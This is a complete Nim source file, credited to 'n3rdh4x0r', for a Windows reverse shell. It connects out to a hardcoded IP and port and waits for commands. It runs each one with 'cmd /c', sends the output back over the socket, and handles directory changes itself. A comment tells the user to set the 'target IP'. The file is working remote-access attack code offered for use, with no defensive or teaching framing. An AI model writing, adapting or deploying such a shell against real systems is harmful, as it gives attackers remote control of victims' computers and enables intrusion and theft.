# Created by n3rdh4x0r

import net, os, osproc, strutils

# Executes a command and returns the output
proc exe(c: string): string =
  result = execProcess("cmd /c " & c)

var
  socket = newSocket()

  # Change these values to match your target IP and port
  targetIP = "10.4.83.137"
  targetPort = "8080"

  exitMessage = "Exiting.."
  cdCommand = "cd"
  defaultDir = "C:\\"

# Attempt to connect to the specified IP and port
try:
  socket.connect(targetIP, Port(parseInt(targetPort)))

  while true:
    socket.send(os.getCurrentDir() & "> ")  # Send current directory as prompt
    let command = socket.recvLine()  # Receive command from remote
    if command == "exit":
      socket.send(exitMessage)
      break

    if command.strip() == cdCommand:
      os.setCurrentDir(defaultDir)
    elif command.strip().startswith(cdCommand):
      let dir = command.strip().split(' ')[1]
      try:
        os.setCurrentDir(dir)
      except OSError as error:
        socket.send(repr(error) & "\n")
        continue
    else:
      let result = exe(command)
      socket.send(result)

except:
  raise
finally:
  socket.close()
